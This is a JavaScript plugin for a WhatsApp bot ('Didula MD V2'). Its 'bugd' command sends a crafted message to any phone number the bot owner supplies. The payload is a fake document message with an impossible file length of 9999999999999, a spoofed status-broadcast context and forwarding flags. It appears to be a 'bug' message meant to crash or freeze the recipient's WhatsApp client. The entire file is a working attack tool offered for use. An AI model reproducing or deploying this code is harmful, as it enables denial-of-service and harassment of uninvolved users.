const config = require('../config');
const { cmd, commands } = require('../command');
const { sleep } = require('../lib/functions');

async function thunderblast_notif(conn, target) {
    await conn.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "Notification Document",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            jpegThumbnail: 'https://i.top4top.io/p_32261nror0.jpg',
                        },
                        hasMediaAttachment: true,
                    },
                    body: {
                        text: "🚀 Thunderblast Notification Activated! 🚀",
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        forwardingScore: 1,
                        isForwarded: true,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                    },
                },
            },
        },
    }, {
        participant: {
            jid: target
        }
    });
}

cmd({
    pattern: "bugd",
    desc: "Send thunderblast notification to a target number",
    category: "owner",
    filename: __filename
}, async (conn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
    try {
        const target = args[0]; // Assuming the first argument is the target number
        if (!target) {
            return reply("Please provide a target number.");
        }

        reply("Didula MD V2 💚 starting...");
        await thunderblast_notif(conn, target); // Invoke the function with the target
        reply("Didula MD V2 💚 starting...");
    } catch (e) {
        console.log(e);
        reply(`${e}`);
    }
});